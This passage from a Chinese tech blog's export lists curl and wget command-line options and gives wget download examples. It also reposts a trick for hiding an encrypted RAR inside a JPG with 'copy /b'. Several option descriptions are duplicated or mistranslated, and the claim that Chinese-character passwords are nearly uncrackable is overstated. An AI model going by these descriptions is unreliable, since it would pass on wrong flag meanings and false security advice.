POST方式传送数据</data></li><li>-data-ascii<data>以ascii的方式post数据</data></li><li>-data-binary<data>以二进制的方式post数据</data></li><li>-negotiate 使用HTTP身份验证</li><li>-digest 使用数字身份验证</li><li>-disable-eprt 禁止使用EPRT或LPRT</li><li>-disable-epsv 禁止使用EPSV</li><li>D/–dump-header<file>把header信息写入到该文件中</file></li><li>-egd-file<file>为随机数据(SSL)设置EGD socket路径</file></li><li>-tcp-nodelay 使用TCP_NODELAY选项</li><li>e/–referer 来源网址</li><li>E/–cert &lt;cert[:passwd]&gt; 客户端证书文件和密码 (SSL)</li><li>-cert-type<type>证书文件类型 (DER/PEM/ENG) (SSL)</type></li><li>-key<key>私钥文件名 (SSL)</key></li><li>-key-type<type>私钥文件类型 (DER/PEM/ENG) (SSL)</type></li><li>-pass<pass>私钥密码 (SSL)</pass></li><li>-engine<eng>加密引擎使用 (SSL). “–engine list” for list</eng></li><li>-cacert<file>CA证书 (SSL)</file></li><li>-capath<directory>CA目录 (made using c_rehash) to verify peer against (SSL)</directory></li><li>-ciphers<list>SSL密码</list></li><li>-compressed 要求返回是压缩的形势 (using deflate or gzip)</li><li>-connect-timeout<seconds>设置最大请求时间</seconds></li><li>-create-dirs 建立本地目录的目录层次结构</li><li>-crlf 上传是把LF转变成CRLF</li><li>f/–fail 连接失败时不显示http错误</li><li>-ftp-create-dirs 如果远程目录不存在，创建远程目录</li><li>-ftp-method [multicwd/nocwd/singlecwd] 控制CWD的使用</li><li>-ftp-pasv 使用 PASV/EPSV 代替端口</li><li>-ftp-skip-pasv-ip 使用PASV的时候,忽略该IP地址</li><li>-ftp-ssl 尝试用 SSL/TLS 来进行ftp数据传输</li><li>-ftp-ssl-reqd 要求用 SSL/TLS 来进行ftp数据传输</li><li>F/–form &lt;name=content&gt; 模拟http表单提交数据</li><li>form-string &lt;name=string&gt; 模拟http表单提交数据</li><li>g/–globoff 禁用网址序列和范围使用{}和[]</li><li>G/–get 以get的方式来发送数据</li><li>h/–help 帮助</li><li>H/–header<line></line>自定义头信息传递给服务器</li><li>-ignore-content-length 忽略的HTTP头信息的长度</li><li>i/–include 输出时包括protocol头信息</li><li>I/–head 只显示文档信息<br>从文件中读取-j/–junk-session-cookies忽略会话Cookie</li><li>界面<interface>指定网络接口/地址使用</interface></li><li>krb4 &lt;级别&gt;启用与指定的安全级别krb4</li><li>j/–junk-session-cookies 读取文件进忽略session cookie</li><li>-interface<interface>使用指定网络接口/地址</interface></li><li>-krb4<level>使用指定安全级别的krb4</level></li><li>k/–insecure 允许不使用证书到SSL站点</li><li>K/–config 指定的配置文件读取</li><li>l/–list-only 列出ftp目录下的文件名称</li><li>-limit-rate<rate>设置传输速度</rate></li><li>-local-port<num>强制使用本地端口号</num></li><li>m/–max-time<seconds>设置最大传输时间</seconds></li><li>-max-redirs<num>设置最大读取的目录数</num></li><li>-max-filesize<bytes>设置最大下载的文件总量</bytes></li><li>M/–manual 显示全手动</li><li>n/–netrc 从netrc文件中读取用户名和密码</li><li>-netrc-optional 使用 .netrc 或者 URL来覆盖-n</li><li>-ntlm 使用 HTTP NTLM 身份验证</li><li>N/–no-buffer 禁用缓冲输出</li><li>o/–output 把输出写到该文件中</li><li>O/–remote-name 把输出写到该文件中，保留远程文件的文件名</li><li>p/–proxytunnel 使用HTTP代理</li><li>-proxy-anyauth 选择任一代理身份验证方法</li><li>-proxy-basic 在代理上使用基本身份验证</li><li>-proxy-digest 在代理上使用数字身份验证</li><li>-proxy-ntlm 在代理上使用ntlm身份验证</li><li>P/–ftp-port<address>使用端口地址，而不是使用PASV</address></li><li>Q/–quote<cmd>文件传输前，发送命令到服务器</cmd></li><li>r/–range<range>检索来自HTTP/1.1或FTP服务器字节范围</range></li><li>-range-file 读取（SSL）的随机文件</li><li>R/–remote-time 在本地生成文件时，保留远程文件时间</li><li>-retry<num>传输出现问题时，重试的次数</num></li><li>-retry-delay<seconds>传输出现问题时，设置重试间隔时间</seconds></li><li>-retry-max-time<seconds>传输出现问题时，设置最大重试时间</seconds></li><li>s/–silent静音模式。不输出任何东西</li><li>S/–show-error 显示错误</li><li>-socks4 &lt;host[:port]&gt; 用socks4代理给定主机和端口</li><li>-socks5 &lt;host[:port]&gt; 用socks5代理给定主机和端口</li><li>-stderr<file></file></li><li>t/–telnet-option &lt;OPT=val&gt; Telnet选项设置</li><li>-trace<file>对指定文件进行debug</file></li><li>-trace-ascii<file>Like –跟踪但没有hex输出</file></li><li>-trace-time 跟踪/详细输出时，添加时间戳</li><li>T/–upload-file<file>上传文件</file></li><li>-url<url>Spet URL to work with</url></li><li>u/–user &lt;user[:password]&gt;设置服务器的用户和密码</li><li>U/–proxy-user &lt;user[:password]&gt;设置代理用户名和密码</li><li>v/–verbose</li><li>V/–version 显示版本信息</li><li>w/–write-out [format]什么输出完成后</li><li>x/–proxy &lt;host[:port]&gt;在给定的端口上使用HTTP代理</li><li>X/–request<command>指定什么命令</li><li>y/–speed-time 放弃限速所要的时间。默认为30</li><li>Y/–speed-limit 停止传输速度的限制，速度时间’秒</li><li>z/–time-cond 传送时间设置</li><li>0/–http1.0 使用HTTP 1.0</li><li>1/–tlsv1 使用TLSv1（SSL）</li><li>2/–sslv2 使用SSLv2的（SSL）</li><li>3/–sslv3 使用的SSLv3（SSL）</li><li>-3p-quote like -Q for the source URL for 3rd party transfer</li><li>-3p-url 使用url，进行第三方传送</li><li>-3p-user 使用用户名和密码，进行第三方传送</li><li>4/–ipv4 使用IP4</li><li>6/–ipv6 使用IP6</li><li>#/–progress-bar 用进度条显示当前的传送状态</li></ul><h2 id="wget参数"><a href="#wget参数" class="headerlink" title="wget参数"></a>wget参数</h2><p>curl 支持的协议比wget多(支持http,https,ftp,gopher,dict,telent,ladap or file)<br>wget [参数列表] [目标软件、网页的网址]</p><p>wget 支持 http ,https, ftp 断点续传</p><p>1.下载整个网页</p><p>wget <a href="http://baidu.com">http://baidu.com</a></p><p>2.下载目录</p><p>wget -r -np -nd <a href="http://www.baid.com/s/">http://www.baid.com/s/</a></p><p>-r表示递归 np表示不遍历父目录 nd 表示在本机重新创建目录结构</p><p>3.wget -r -np -nd -accept=jpg,txt <a href="http://www.baidu.com/s/">http://www.baidu.com/s/</a></p><p>accept=jpg,txt 表示只下载 s目录下 jpg txt文件</p><p>4.wget -r -np -nd -reject=jpg,txt <a href="http://www.baidu.com/s/">http://www.baidu.com/s/</a></p><p>reject=jpg,txt 表示除jpg txt文件外，下载s目录下其他所有文件</p><p>5.wget -i address.txt</p><p>实现批量下载，下载地址保存在 address.txt中</p><p>-V,–version 显示软件版本号然后退出；<br>-h,–help显示软件帮助信息；<br>-e,–execute=COMMAND 执行一个 “.wgetrc”命令</p><p>-o,–output-file=FILE 将软件输出信息保存到文件；<br>-a,–append-output=FILE将软件输出信息追加到文件；<br>-d,–debug显示输出信息；<br>-q,–quiet 不显示输出信息；<br>-i,–input-file=FILE 从文件中取得URL；</p><p>-t,–tries=NUMBER 是否下载次数（0表示无穷次）<br>-O –output-document=FILE下载文件保存为别的文件名<br>-nc, –no-clobber 不要覆盖已经存在的文件<br>-N,–timestamping只下载比本地新的文件<br>-T,–timeout=SECONDS 设置超时时间<br>-Y,–proxy=on/off 关闭代理</p><p>-nd,–no-directories 不建立目录<br>-x,–force-directories 强制建立目录</p><p>–http-user=USER设置HTTP用户<br>–http-passwd=PASS设置HTTP密码<br>–proxy-user=USER设置代理用户<br>–proxy-passwd=PASS设置代理密码</p><p>-r,–recursive 下载整个网站、目录（小心使用）<br>-l,–level=NUMBER 下载层次</p><p>-A,–accept=LIST 可以接受的文件类型<br>-R,–reject=LIST拒绝接受的文件类型<br>-D,–domains=LIST可以接受的域名<br>–exclude-domains=LIST拒绝的域名<br>-L,–relative 下载关联链接<br>–follow-ftp 只下载FTP链接<br>-H,–span-hosts 可以下载外面的主机<br>-I,–include-directories=LIST允许的目录<br>-X,–exclude-directories=LIST 拒绝的目录</p><h2 id="使用DOS-COPY-b隐藏文件-转"><a href="#使用DOS-COPY-b隐藏文件-转" class="headerlink" title="使用DOS COPY /b隐藏文件[转]"></a>使用DOS COPY /b隐藏文件[转]</h2><p>我们平时为了隐藏一些文件，费尽心思，不同的人有不同的方法去隐藏，有的人会放进系统文件夹，有些人会放到一些不起眼的文件夹里，有的人放进回收站（要是碰上我就惨了，我有时不时清空回收站的爱好）。有的用软件来隐藏，一旦忘记了密码，就找不回文件了，哭死！！！ 其实最危险的地方就是最安全的地方，这句话相信我们都听说过。但也不是叫你把东西放到桌面上，起名叫做我的自拍照，这样的话，怎么也安全不过去吧。 下面给大家介绍一个很好用的方法，要用到DOS指令里的COPY命令，DOS菜鸟不用担心，很简单的。 第一步：准备好我们要隐藏的文件，例如是一个word文档的doc文件，叫做：file.doc 第二步：准备好一张jpg图片，大小无所谓。例如jpg图片叫做：pic.jpg 第三步：把file.doc给压缩成rar文件（如果你的电脑上没有装rar软件的话，那我就没话说了，赶快下载一个装去），在file.doc上击右键，选择添加到压缩文件，在常规那里写入文件名，起名为file.rar，选择上方的高级，点击右边的设置密码按键，把显示密码和加密文件夹给勾上，然后输入一个中文密码，例如密码为：我是菜鸟我怕谁，然后按确定。 [为什么要用中文密码呢？因为中文密码没有人想得到，就算想到你是用了中文密码，要破解也是难上加难啊。如果用中文再混上个特殊符号如：！·#￥%……——*（之类的，再加个数字9加个字母z,这密码就更变态了] [为什么要加密文件名呢？因为加密了文件名后，人家双击了你的RAR文件，就要密码，没有密码连文件名都不给你看，别说是解压。] 第四步：在开始的运行那里输入cmd进入控制台，假如你的file.rar和pic.jpg放在D盘下，你就在控制台里输入D: 回车进入D盘，然后输入：copy /b pic.jpg+file.rar file.jpg 这样就完成了，这时候，D盘应该会生成一个叫做file.jpg的图片，打开一看，和pic.jpg是一样的，但是查看一下大小，你会发现，其大小是file.rar和pic.jpg加起来的大小，没错，合并在一起了，你的rar文件就在其中。<br>如果你想查看你的rar，很简单，直接把后缀名改为.rar就OK了，双击之后，会要求你输入密码，因为刚才你设置了密码嘛，输入你的中文，怎么回事？？？中文不能输入，哈哈！！！打开记事本，先把中文密码输入进去，然后复制这几个字，再粘贴到rar上面就行了。 再把后缀rar改为jpg，就又变回图片了，怎么样，好玩吧。这样的图片，放在哪都安全，只要不被人家删掉的啦。</p>]]></content>
      <categories>
        <category>curl</category>
      </categories>
      <tags>
        <tag>curl</tag>
        <tag>http命令行工具</tag>
        <tag>copy /b隐藏文件</tag>
        <tag>wget</tag>
      </tags>
  </entry>
  <entry>
    <title>测试图片</title>
    <url>/2015/02/09/%E6%B5%8B%E8%AF%95%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<p>看了看，以后有图片应该要放在哪儿。</p><ul><li><p>godaddy有域名附带提供的免费外链相册</p></li><li><p>各种免费图床</p></li><li><p>七牛</p><p>也许以后会使用七牛吧。先测试发下图。</p><a id="more"></a></li></ul><p><img alt="测试发图" data-src="http://dl57.yunpan.360.cn/intf.php?method=Preview.outputPublicPic&qid=&fname=%E6%B5%8B%E8%AF%95%E5%9B%BE-%E8%B7%B3%E9%AB%98.gif&fhash=b1f269a5d8a8bf5a5b754a42c2d16a09f79e9109&dt=57_51.39f97c5b934f432f3bfabdb2fec43fd6&v=1.0.1&rtick=14234633216412&open_app_id=0&devtype=web&sign=275f938dbf531addd152caf942e8bdf3&"><br>ps:使用360云盘存储图片。想想也是觉得自己太猥琐了</p>]]></content>
  </entry>
</search>
